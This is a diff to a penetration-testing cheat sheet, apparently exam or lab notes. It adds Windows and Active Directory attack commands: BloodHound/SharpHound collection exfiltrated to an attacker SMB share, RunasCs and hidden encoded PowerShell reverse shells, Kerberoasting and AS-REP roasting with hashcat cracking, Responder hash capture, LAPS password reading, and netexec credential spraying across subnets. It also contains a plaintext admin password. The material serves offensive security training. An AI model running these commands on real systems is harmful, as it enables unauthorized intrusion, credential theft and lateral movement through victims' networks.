@@ -402,6 +402,7 @@ find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
 # Username and hostname
 whoami
 # Privileges
+# https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#abusing-tokens
 whoami /priv
 # Groups user is member of
 whoami /groups
@@ -455,6 +456,31 @@ cp /usr/share/peass/winpeas/winPEASx64.exe .
 python3 -m http.server 80
 iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
+
+# Bloodhound
+# Install and run
+git clone https://github.com/SpecterOps/BloodHound.git
+# Start docker daemon
+sudo dockerd
+# Start docker
+sudo docker compose up -d
+sudo docker compose ps
+# Get password for 'admin' user
+# Current: 6Br6HLOTlTtbuxfbaw3uASkbM9kd5fWg
+sudo docker compose logs | grep -i -E 'password|username|credential'
+sudo docker compose logs | less
+/password
+# Collect DB
+# Run SharpHound on target
+python3 -m http.server 80 --directory /usr/share/sharphound
+iwr -uri http://192.168.45.229/SharpHound.exe -Outfile sharphound.exe
+./sharphound.exe -c All
+# Setup SMB share on host and copy to it from target
+mkdir -p ~/transfer
+impacket-smbserver transfer ~/transfer -smb2support
+copy ARCHIVE.zip \\IP\transfer\
+# Go to localhost:8080 and upload
+# Check 'shortest path to high value targets
 ```
 
 ##### Execute as other user
@@ -462,6 +488,18 @@ iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
 ``` sh
 # Run cmd as other user (need password)
 runas /user:USER cmd
+
+# RunAsc (more options)
+# https://github.com/antonioCoco/RunasCs
+# Open reverse shell
+Invoke-RunasCs -Username USER -Password PASS -Command cmd.exe -Remote IP:PORT
+
+# Run as other user in PowerShell
+password = ConvertTo-SecureString "PASS" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential ("DOMAIN\USER", $password)
+Get-ADUser -Identity USER -Credential $credential
+nc -nlvp 4445
+Start-Process powershell -Credential $credential -ArgumentList "-nop -w hidden -e BASE64"
 ```
 
 ##### Windows Services
@@ -602,6 +640,17 @@ certutil -urlcache -split -f http://192.168.45.235/nc.exe
 # PrintSpoofer (alternative)
 iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 PrintSpoofer64.exe -i -c "cmd /c cmd.exe"
+```
+
+##### Kerberoast
+
+https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
+
+``` sh
+# Check Kerberoastable users
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+# Crack
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt 
 ```
 
 ##### Code Samples
@@ -958,7 +1007,39 @@ smbmap -H IP
 
 ```sh
 # Validate if credentials work
-netexec smb IP -u 'USER' -p 'PASSSWORD'
+nxc smb IP -u 'USER' -p 'PASSSWORD'
+# Authenticate as domain user
+nxc smb IP -u 'USER' -p 'PASS' -d DOMAIN
+# Enumerate SMB shares
+nxc smb IP -u 'USER' -p 'PASS' --shares
+# Enumerate domain users
+nxc smb IP -u 'USER' -p 'PASS' --users
+# Enumerate domain groups
+nxc smb IP -u 'USER' -p 'PASS' --groups
+# Enumerate domain computers
+nxc smb IP -u 'USER' -p 'PASS' --computers
+# Enumerate logged-on users
+nxc smb IP -u 'USER' -p 'PASS' --loggedon-users
+# Enumerate sessions
+nxc smb IP -u 'USER' -p 'PASS' --sessions
+# Password policy
+nxc smb IP -u 'USER' -p 'PASS' --pass-pol
+# RID enumeration
+nxc smb IP -u 'USER' -p 'PASS' --rid-brute
+# Local users
+nxc smb IP -u 'USER' -p 'PASS' --local-users
+# Local groups
+nxc smb IP -u 'USER' -p 'PASS' --local-groups
+
+# SMB file/share enumeration
+# Once --shares identifies interesting shares:
+nxc smb IP -u 'USER' -p 'PASS' -M spider_plus
+# Target a specific share:
+nxc smb IP -u 'USER' -p 'PASS' -M spider_plus -o READ_ONLY=false
+# Check whether the credential has administrative access:
+nxc smb IP -u 'USER' -p 'PASS'
+# Against a subnet containing other Windows hosts:
+nxc smb IP/24 -u 'USER' -p 'PASS'
 ```
 
 ##### smbclient
@@ -1039,8 +1120,9 @@ dir \\KALI_IP\test
 # Display adapters
 ip a
 # Run Responder on adapter
-sudo responder -I tap0
+sudo responder -I tun0 -wv
 # From target machine, run simple dir listing to Responder
+# If you have SSRF on a DC, also try to make request to host
 dir \\IP\test
 # Crack captured Net-NTLMv2 hash with hashcat
 hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
@@ -1110,10 +1192,32 @@ ldapdomaindump IP -u 'DOMAIN\USER' -p 'PASSWORD'
 ##### netexec
 
 ``` sh
+# Basic LDAP authentication
+nxc ldap IP -u 'USER' -p 'PASS'
+# Specify domain
+nxc ldap IP -u 'USER' -p 'PASS' -d DOMAIN
+# Enumerate users
+nxc ldap IP -u 'USER' -p 'PASS' --users
+# Enumerate groups
+nxc ldap IP -u 'USER' -p 'PASS' --groups
+# Enumerate computers
+nxc ldap IP -u 'USER' -p 'PASS' --computers
+# Useful AD security-property enumeration:
+# Accounts with "password not required"
+nxc ldap IP -u 'USER' -p 'PASS' --password-not-required
+# Accounts with adminCount
+nxc ldap IP -u 'USER' -p 'PASS' --admin-count
+# Computers/users associated with delegation
+nxc ldap IP -u 'USER' -p 'PASS' --trusted-for-delegation
+# Kerberos-related enumeration:
+# AS-REP roastable accounts
+nxc ldap IP -u 'USER' -p 'PASS' --asreproast asrep.txt
+# Kerberoastable accounts
+nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
+# BloodHound collection, where supported by your installed NetExec version:
+nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All
 # Read LAPS password
-netexec ldap IP -u 'USER' -p 'PASSWORD' -M laps
-# Confirm credential
-netexec ldap IP -u Administrator -p 'PASSWORD'
+nxc ldap IP -u 'USER' -p 'PASSWORD' -M laps
 ```
 
 #### Squid Proxy (TCP: 3128)
@@ -1138,13 +1242,50 @@ curl --proxy http://IP:3128 http://IP:PORT
 proxychains TOOL_WITH_PARAMETERS
 ```
 
+#### RDP (TCP: 3389)
+
+##### netexec
+
+``` sh
+# Check RDP authentication
+nxc rdp IP -u 'USER' -p 'PASS'
+# Check multiple hosts
+nxc rdp IP/24 -u 'USER' -p 'PASS'
+# Useful RDP information, depending on NetExec version:
+nxc rdp IP -u 'USER' -p 'PASS' --nla
+```
+
+##### Connect
+
+``` sh
+# xfreerdp3
+xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
+# rdesktop (no auth needed)
+rdesktop IP
+```
+
 #### WinRM (TCP: 5985/5986)
+
+##### Evil-WinRM
 
 ```sh
 # Remote login
 evil-winrm -i IP -u 'USER' -p 'PASSWORD' 
 # Remote login with hash
 evil-winrm -i IP -u 'USER' -H 'NTHASH'
+```
+
+##### netexec
+
+``` sh
+# Check whether the credential can authenticate to WinRM:
+nxc winrm IP -u 'USER' -p 'PASS'
+# Check an entire subnet:
+nxc winrm IP/24 -u 'USER' -p 'PASS'
+# Test multiple usernames:
+nxc winrm IP -u users.txt -p 'PASS'
+# Test a password against multiple users:
+nxc winrm IP -u users.txt -p 'PASS'
 ```
 
 #### Databases
@@ -1375,6 +1516,10 @@ mysql -u USER --password=PASS -h localhost -e "use wp;UPDATE wp_users SET user_p
 # Impacket
 # Change password
 impacket-changepasswd USER@DOMAIN -newpass 'NEWPASSWORD'
+# Setup SMB share on host and copy to it from target
+mkdir -p ~/transfer
+impacket-smbserver transfer ~/transfer -smb2support
+copy FILE \\IP\transfer\
 ```
 
 ### Kali Setup
